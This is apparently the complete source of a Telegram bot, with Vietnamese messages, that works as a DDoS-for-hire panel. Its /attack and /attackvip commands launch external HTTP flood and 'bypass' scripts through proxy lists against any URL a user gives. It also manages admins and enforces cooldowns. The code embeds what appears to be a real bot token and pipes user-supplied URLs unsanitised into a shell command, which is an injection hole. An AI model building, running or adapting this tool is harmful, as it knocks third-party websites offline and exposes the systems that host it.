const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const { exec } = require('child_process');

// --- CONFIG ---
const BOT_TOKEN = "8075150737:AAGiXi9V8OGXZqIGdS5e6Q8h5iEaB9GCsaI";
const GROUP_ID = -1002535925512;
const ADMIN_FILE = "admins.json";
const PROXY_FILE = "proxy.txt";
const VIP_PROXY = "text.txt";
const BLACKLIST = [
    "thcsnguyentrai.pgdductrong.edu.vn", "intenseapi.com", "edu.vn",
    "thisinh.thitotnghiepthpt.edu.vn", "gov.vn", "stats.firewall.mom",
    "www.nasa.gov", "neverlosevip.store", "youtube.com", "google.com",
    "facebook.com", "chinhphu.vn"
];

// --- ADMIN FILE LOADING ---
let admin_data = {};
try {
    admin_data = JSON.parse(fs.readFileSync(ADMIN_FILE));
} catch {
    admin_data = { main_admin: 123456789, sub_admins: [] };
}

const ADMIN_MAIN_ID = admin_data.main_admin;
const ADMIN_IDS = [ADMIN_MAIN_ID, ...admin_data.sub_admins];

// --- CONFIG SETTINGS ---
const MAX_USER_TIME = 60;
const DEFAULT_RATE = 20;
const DEFAULT_THREAD = 10;
let bot_status = true;
let user_last_attack_time = {};
let attack_processes = [];
const start_time = Date.now();

// --- UTILS ---
const is_blacklisted = (url) => BLACKLIST.some(bad => url.includes(bad));
const save_admins = () => fs.writeFileSync(ADMIN_FILE, JSON.stringify(admin_data, null, 2));

// --- BOT SETUP ---
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.onText(/\/start/, (msg) => {
    const status = bot_status ? "ON" : "OFF";
    bot.sendMessage(msg.chat.id,
        `Bot đang: [${status}]\n` +
        `/attack <url> <time>\n` +
        `/attackvip <url> <time> <flood|bypass>\n` +
        `/proxy - Xem so luong proxy\n` +
        `/time - Xem uptime bot\n` +
        `/addadmin <id>, /deladmin <id> (admin chinh)\n` +
        `/listadmin - Xem danh sach admin`);
});

// --- /attack ---
bot.onText(/\/attack (.+) (.+)/, (msg, match) => {
    const [url, timeStr] = match.slice(1);
    const chat_id = msg.chat.id, user_id = msg.from.id, now = Date.now() / 1000;
    const duration = parseInt(timeStr);

    if (chat_id !== GROUP_ID) return bot.sendMessage(chat_id, "Box chua duoc duyet.");
    if (!bot_status) return bot.sendMessage(chat_id, "Bot đang tat.");
    if (!ADMIN_IDS.includes(user_id) && now - (user_last_attack_time[user_id] || 0) < MAX_USER_TIME)
        return bot.sendMessage(chat_id, `Cho ${Math.floor(MAX_USER_TIME - (now - user_last_attack_time[user_id]))} giay nua.`);
    if (!ADMIN_IDS.includes(user_id) && duration > MAX_USER_TIME)
        return bot.sendMessage(chat_id, `Toi đa ${MAX_USER_TIME} giay.`);
    if (is_blacklisted(url)) return bot.sendMessage(chat_id, "URL nay bi cam trong blacklist.");

    const cmd = `node bypass.js ${url} ${duration} ${DEFAULT_RATE} ${DEFAULT_THREAD} ${PROXY_FILE}`;
    exec(cmd);
    user_last_attack_time[user_id] = now;

    const msgText = JSON.stringify({
        Status: "✨🗿🚦 Attack Started 🛸🚥✨",
        Caller: `@${msg.from.username || user_id}`,
        PID: now,
        Website: url,
        Time: `${duration} Giay`,
        MaxTime: MAX_USER_TIME,
        Method: "flood",
        StartTime: new Date().toLocaleString()
    }, null, 2);

    const options = {
        reply_markup: {
            inline_keyboard: [[{ text: "Kiem Tra Website", url: `https://check-host.net/check-http?host=${encodeURIComponent(url)}` }]]
        }
    };
    bot.sendMessage(chat_id, msgText, options);
    setTimeout(() => bot.sendMessage(chat_id, "✅ Đa hoan tat attack!"), duration * 1000);
});

// --- /attackvip ---
bot.onText(/\/attackvip (.+) (.+) (.+)/, (msg, match) => {
    const [url, timeStr, method] = match.slice(1);
    const chat_id = msg.chat.id, user_id = msg.from.id, duration = parseInt(timeStr);

    if (!ADMIN_IDS.includes(user_id)) return bot.sendMessage(chat_id, "Chi admin đuoc dung.");
    if (!["flood", "bypass"].includes(method)) return bot.sendMessage(chat_id, "Phuong thuc phai la 'flood' hoac 'bypass'.");

    const cmd = `node zentra.js ${url} ${duration} 20 15 ${VIP_PROXY} ${method}`;
    exec(cmd);
    user_last_attack_time[user_id] = Date.now() / 1000;

    const msgText = JSON.stringify({
        Status: "✨ VIP Attack Started ✨",
        Caller: `@${msg.from.username || user_id}`,
        PID: parseInt(Date.now() / 1000),
        URL: url,
        Time: `${duration} Giay`,
        Rate: "20", Thread: "15",
        Proxy: VIP_PROXY,
        Method: method,
        StartTime: new Date().toLocaleString()
    }, null, 2);

    const options = {
        reply_markup: {
            inline_keyboard: [[{ text: "Kiem Tra Website", url: `https://check-host.net/check-http?host=${encodeURIComponent(url)}` }]]
        }
    };
    bot.sendMessage(chat_id, msgText, options);
    setTimeout(() => bot.sendMessage(chat_id, "✅ VIP attack hoan tat!"), duration * 1000);
});

// --- /proxy ---
bot.onText(/\/proxy/, (msg) => {
    try {
        const data = fs.readFileSync(VIP_PROXY, 'utf8').trim().split('\n');
        bot.sendMessage(msg.chat.id, `So luong proxy: ${data.length}`);
        bot.sendDocument(msg.chat.id, VIP_PROXY);
    } catch {
        bot.sendMessage(msg.chat.id, "Khong tim thay file proxy.");
    }
});

// --- /time ---
bot.onText(/\/time/, (msg) => {
    const uptime = Math.floor((Date.now() - start_time) / 1000);
    const h = Math.floor(uptime / 3600);
    const m = Math.floor((uptime % 3600) / 60);
    const s = uptime % 60;
    bot.sendMessage(msg.chat.id, `Bot đa hoat đong: ${h} gio, ${m} phut, ${s} giay`);
});

// --- /addadmin ---
bot.onText(/\/addadmin (\d+)/, (msg, match) => {
    const user_id = msg.from.id;
    const new_id = parseInt(match[1]);
    if (user_id !== ADMIN_MAIN_ID) return bot.sendMessage(msg.chat.id, "Chi admin chinh đuoc them.");
    if (ADMIN_IDS.includes(new_id)) return bot.sendMessage(msg.chat.id, "ID nay đa la admin.");

    admin_data.sub_admins.push(new_id);
    save_admins();
    ADMIN_IDS.push(new_id);
    bot.sendMessage(msg.chat.id, `Đa them admin phu: ${new_id}`);
});

// --- /deladmin ---
bot.onText(/\/deladmin (\d+)/, (msg, match) => {
    const user_id = msg.from.id;
    const del_id = parseInt(match[1]);
    if (user_id !== ADMIN_MAIN_ID) return bot.sendMessage(msg.chat.id, "Chi admin chinh đuoc xoa.");
    if (!admin_data.sub_admins.includes(del_id)) return bot.sendMessage(msg.chat.id, "ID khong ton tai trong admin phu.");

    admin_data.sub_admins = admin_data.sub_admins.filter(id => id !== del_id);
    save_admins();
    const index = ADMIN_IDS.indexOf(del_id);
    if (index > -1) ADMIN_IDS.splice(index, 1);
    bot.sendMessage(msg.chat.id, `Đa xoa admin phu: ${del_id}`);
});

// --- /listadmin ---
bot.onText(/\/listadmin/, (msg) => {
    if (!ADMIN_IDS.includes(msg.from.id)) return;
    bot.sendMessage(msg.chat.id,
        `ADMIN CHINH: ${ADMIN_MAIN_ID}\nSUB ADMIN: ${admin_data.sub_admins.join(', ')}`);
});

// --- START ---
console.log("Bot is running...");
